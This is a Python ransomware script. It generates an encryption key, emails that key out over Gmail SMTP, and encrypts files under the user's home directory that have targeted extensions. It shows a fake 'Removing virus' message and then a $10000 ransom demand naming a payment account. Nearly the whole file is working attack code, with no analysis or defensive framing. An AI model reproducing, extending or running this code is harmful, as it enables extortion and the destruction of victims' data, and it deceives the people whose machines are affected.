import os
from os.path import expanduser
from cryptography.fernet import Fernet
import base64

email = "your email"
password = "your password"
class Ransomware:

    def __init__(self, key=None):
        """
        Initializes an instance of the Ransomware class.
        
        Args:
            key: 128-bit AES key used to encrypt or decrypt files
        
        Attributes:
            cryptor:fernet.Fernet: Object with encrypt and decrypt methods, set when key is generated if key is not passed 
            file_ext_targets:list<str>: List of strings of allowed file extensions for encryption
        """

        self.key = key
        self.cryptor = None
        self.file_ext_targets = ['z' ]


    def generate_key(self):
        """
        Generates a 128-bit AES key for encrypting files. Sets self.cyptor with a Fernet object
        """

        self.key = Fernet.generate_key()
        self.cryptor = Fernet(self.key)

    
    def read_key(self):
        """
        Read key sent to user from attaker via mail.
        """

        self.key = bytes(input("Enter Key sent to your mail:- \n"),'utf-8')
        self.cryptor = Fernet(self.key)


    def send_key(self):
        import smtplib 
          
        # creates SMTP session 
        s = smtplib.SMTP('smtp.gmail.com', 587) 
          
        # start TLS for security 
        s.starttls() 
          
        # Authentication 
        s.login(email, password) 
          
        
          
        # sending the mail 
        s.sendmail(email, email, self.key) 
          
        # terminating the session 
        s.quit()

    def crypt_root(self, root_dir, encrypted=False):
        """
        Recursively encrypts or decrypts files from root directory with allowed file extensions
        Args:
            root_dir:str: Absolute path of top level directory
            encrypt:bool: Specify whether to encrypt or decrypt encountered files
        """

        for root, _, files in os.walk(root_dir):
            for f in files:
                abs_file_path = os.path.join(root, f)


                # if not a file extension target, pass
                if not abs_file_path.split('.')[-1] in self.file_ext_targets:
                    continue
                # print(abs_file_path)
                self.crypt_file(abs_file_path, encrypted=encrypted)
                



    def crypt_file(self, file_path, encrypted=False):
        """
        Encrypts or decrypts a file
        Args:
            file_path:str: Absolute path to a file 
        """

        with open(file_path, 'rb+') as f:
            _data = f.read()

            if not encrypted:
                # print(f'File contents pre encryption: {_data}')
                data = self.cryptor.encrypt(_data)
                # print(f'File contents post encryption: {data}')
            else:
                data = self.cryptor.decrypt(_data)
                # print(f'File content post decryption: {data}')
            
            f.seek(0)
            f.truncate()
            f.write(data)


if __name__ == '__main__':
    # sys_root = expanduser('~')
    local_root = expanduser('~')
    # local_root = '.'

    #rware.generate_key()
    #rware.write_key()
    rware = Ransomware()

    rware.generate_key()
    rware.send_key()
    print("Removing virus from your computer...")
    rware.crypt_root(local_root)

    print("Your data has been encrypted do not try to close the window or edit the files pay $10000 to account 6464454464645665 to recieve the key to decrypt.")

    print(" Enter the key receieved on your mail")
    rware.read_key()
    rware.crypt_root(local_root, encrypted=True)



